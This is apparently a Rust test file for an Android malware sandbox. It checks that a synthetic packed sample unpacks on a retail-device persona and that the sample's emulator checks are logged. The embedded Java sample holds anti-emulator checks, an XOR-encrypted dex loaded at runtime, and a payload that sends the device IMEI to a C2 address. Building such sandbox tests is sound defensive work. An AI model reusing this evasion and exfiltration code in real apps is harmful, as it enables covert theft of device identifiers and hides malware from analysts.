//! Anti-analysis behaviour: a sample that refuses to unpack on an obvious
//! emulator must still tell us what it checks, and must still unpack when the
//! scenario presents a plausible device. This is the "scenario sweep" payoff.

mod support;

use std::sync::Arc;

use support::javadex::compile_to_dex;
use unshroud::dex::DexFile;
use unshroud::scenario::{self, RunConfig};
use unshroud::vm::env::Persona;
use unshroud::vm::registry::Registry;

const GATED: &str = r#"
package com.example.packed;
import android.content.Context;
import dalvik.system.DexClassLoader;
import java.io.InputStream;
import java.io.ByteArrayOutputStream;
import java.lang.reflect.Method;

public class Gate {
    public static void attach(Context ctx) {
        // Three classic checks, each independently fatal.
        String fp = android.os.Build.FINGERPRINT;
        if (fp == null) return;
        if (fp.contains("generic") || fp.contains("sdk") || fp.contains("test-keys")) return;
        if (android.os.Build.MODEL.contains("google_sdk")) return;
        String imei = ((android.telephony.TelephonyManager)
            ctx.getSystemService("phone")).getDeviceId();
        if (imei == null || imei.length() < 10) return;
        try {
            byte[] enc = read(ctx, "p.dat");
            byte[] dec = new byte[enc.length];
            for (int i = 0; i < enc.length; i++) dec[i] = (byte) (enc[i] ^ 0x33);
            java.io.FileOutputStream fos = ctx.openFileOutput("q.dex", 0);
            fos.write(dec); fos.close();
            DexClassLoader cl = new DexClassLoader(ctx.getFilesDir().getAbsolutePath() + "/q.dex",
                ctx.getCacheDir().getAbsolutePath(), null, Gate.class.getClassLoader());
            Class<?> c = cl.loadClass("com.example.payload.Exec");
            c.getMethod("fire", Context.class).invoke(null, ctx);
        } catch (Throwable t) { }
    }
    static byte[] read(Context ctx, String name) throws Exception {
        InputStream in = ctx.getAssets().open(name);
        ByteArrayOutputStream out = new ByteArrayOutputStream();
        byte[] b = new byte[8192]; int n;
        while ((n = in.read(b)) > 0) out.write(b, 0, n);
        return out.toByteArray();
    }
}
"#;

const EXFIL: &str = r#"
package com.example.payload;
import android.content.Context;
public class Exec {
    public static void fire(Context ctx) {
        try {
            String imei = ((android.telephony.TelephonyManager)
                ctx.getSystemService("phone")).getDeviceId();
            java.net.HttpURLConnection c = (java.net.HttpURLConnection)
                new java.net.URL("http://198.51.100.7/c2?x=" + imei).openConnection();
            c.connect();
        } catch (Throwable t) { }
    }
}
"#;

fn build_apk(shell: &[u8], payload: &[u8]) -> Vec<u8> {
    let mut enc = payload.to_vec();
    for b in enc.iter_mut() { *b ^= 0x33; }
    let mut buf = std::io::Cursor::new(Vec::new());
    {
        use std::io::Write;
        use zip::write::SimpleFileOptions;
        let mut w = zip::ZipWriter::new(&mut buf);
        let opts = SimpleFileOptions::default();
        w.start_file("classes.dex", opts).unwrap();
        w.write_all(shell).unwrap();
        w.start_file("assets/p.dat", opts).unwrap();
        w.write_all(&enc).unwrap();
        w.finish().unwrap();
    }
    buf.into_inner()
}

#[test]
fn unpacking_succeeds_on_a_retail_device() {
    let Some(shell) = compile_to_dex("Gate", GATED) else { return };
    let Some(payload) = compile_to_dex("Exec", EXFIL) else { return };
    let apk = build_apk(&shell, &payload);
    let mut report = unshroud::report::SampleReport::empty("g.apk");
    let st = unshroud::apk::analyze(&apk, &mut report).unwrap();
    let mut reg = Registry::new();
    for d in &st.dexes {
        reg.add_image(Arc::new(DexFile::parse(d.origin.clone(), d.dex.data.as_ref().clone()).unwrap()), false);
    }
    let cfg = RunConfig {
        step_limit: 20_000_000,
        per_scenario_ms: 30_000,
        assets: st.assets.iter().map(|(k, v)| (k.clone(), v.clone())).collect(),
        ..Default::default()
    };
    let out = scenario::run(reg, vec![Persona::retail_default()], &cfg);
    assert!(!out.dynamic_dumps.is_empty(), "should unpack on retail device; notes {:?}", out.notes);
    let sc = &out.scenarios[0];
    assert!(sc.findings.iter().any(|f| f.detail.contains("198.51.100.7")),
        "should reach the C2; findings {:?}", sc.findings.iter().map(|f| &f.detail).collect::<Vec<_>>());
    // And the probes that gated it are recorded for the analyst.
    assert!(sc.probes.iter().any(|p| p.api.contains("FINGERPRINT")));
    assert!(sc.probes.iter().any(|p| p.api.contains("getDeviceId")));
}

#[test]
fn evasion_probes_are_recorded_when_the_gate_short_circuits() {
    // A device whose identity *is* emulator-shaped: the sample should bail,
    // but its checks must show up in the report.
    let Some(shell) = compile_to_dex("Gate", GATED) else { return };
    let Some(payload) = compile_to_dex("Exec", EXFIL) else { return };
    let apk = build_apk(&shell, &payload);
    let mut report = unshroud::report::SampleReport::empty("g.apk");
    let st = unshroud::apk::analyze(&apk, &mut report).unwrap();
    let mut reg = Registry::new();
    for d in &st.dexes {
        reg.add_image(Arc::new(DexFile::parse(d.origin.clone(), d.dex.data.as_ref().clone()).unwrap()), false);
    }
    let mut emu = Persona::retail_default();
    emu.identity.fingerprint = "google/sdk_gphone_x86/generic_x86:10/QSR1.191030.002/6201691:userdebug/test-keys".into();
    emu.identity.model = "google_sdk".into();
    emu.name = "emulator_like".into();
    let cfg = RunConfig {
        step_limit: 20_000_000,
        per_scenario_ms: 30_000,
        assets: st.assets.iter().map(|(k, v)| (k.clone(), v.clone())).collect(),
        ..Default::default()
    };
    let out = scenario::run(reg, vec![emu], &cfg);
    let sc = &out.scenarios[0];
    // On this device the gate should trip: no payload unpacked.
    assert!(out.dynamic_dumps.is_empty(), "emulator-shaped device should trip the gate");
    // But the fingerprint read is recorded, which is the actionable output.
    let fp_probe = sc.probes.iter().find(|p| p.api.contains("FINGERPRINT"));
    assert!(fp_probe.is_some(), "the fingerprint check must be recorded");
    assert!(fp_probe.unwrap().value.contains("test-keys"));
}

#[test]
fn no_network_when_device_is_unreachable() {
    let Some(shell) = compile_to_dex("Gate", GATED) else { return };
    let Some(payload) = compile_to_dex("Exec", EXFIL) else { return };
    let apk = build_apk(&shell, &payload);
    let mut report = unshroud::report::SampleReport::empty("g.apk");
    let st = unshroud::apk::analyze(&apk, &mut report).unwrap();
    let mut reg = Registry::new();
    for d in &st.dexes {
        reg.add_image(Arc::new(DexFile::parse(d.origin.clone(), d.dex.data.as_ref().clone()).unwrap()), false);
    }
    let mut offline = Persona::retail_default();
    offline.network.reachable = false;
    offline.name = "offline".into();
    let cfg = RunConfig {
        step_limit: 20_000_000,
        per_scenario_ms: 30_000,
        assets: st.assets.iter().map(|(k, v)| (k.clone(), v.clone())).collect(),
        ..Default::default()
    };
    let out = scenario::run(reg, vec![offline], &cfg);
    // Offline means no request was recorded, but the payload should still have
    // been unpacked: reachability is not a gate on the decryption.
    assert!(!out.dynamic_dumps.is_empty(), "unpacking should not require network");
}
